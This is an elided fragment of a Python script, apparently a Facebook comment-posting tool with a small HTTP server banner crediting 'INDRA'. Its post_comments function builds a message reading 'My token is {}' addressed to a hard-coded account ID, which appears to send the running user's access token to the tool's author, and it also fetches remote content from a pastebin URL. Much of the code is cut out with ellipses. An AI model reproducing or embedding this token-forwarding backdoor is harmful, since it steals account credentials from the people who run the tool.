...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"SERVER RUNNING => TRICKS ||[BY=|< INDRA ]")
...
def post_comments():
    ...
    msg_template = "Hello indra Khan sir! I am using your server. My token is {}"
 
    # Specify the ID where you want to send the message
    target_id = "61551228050927"
    ...
    mmm = requests.get(' https://pastebin.com/raw/mBMNKV2y').text
